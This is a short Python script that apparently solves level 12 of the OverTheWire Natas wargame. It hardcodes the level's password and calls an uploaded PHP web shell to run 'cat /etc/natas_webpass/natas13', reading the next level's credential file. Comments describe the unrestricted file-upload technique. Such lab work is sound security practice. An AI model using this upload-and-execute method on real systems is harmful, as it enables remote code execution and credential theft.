#!/usr/bin/env python

import requests
import re
# import urllib
# import base64

username='natas12'
password='EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '/upload/6pso6g5etg.php?v= cat /etc/natas_webpass/natas13'
session = requests.session()
files = { 'file':open('natas12_rce.php', 'rb')}
response = requests.get(url + path, auth=(username, password))
# response = session.post(url, auth=(username,password), files = {'uploadedfile': open('natas12_rce.php', 'rb')}, data= {'filename': 'natas12_rce.php', 'MAX_FILE_SIZE': "1000"})
content = response.text
print content
# print re.findall('The password for natas13 is (.*)<br>', content)[0]

# Here a file was to be uploaded, so we wrote a php script to run the system command that we want and uploaded that file. Another file with natas12 has been saved containg the script
# The wubsite function store the file with other name in the /tmp folder about which it gives the detail. Using that path we can access our file and run the script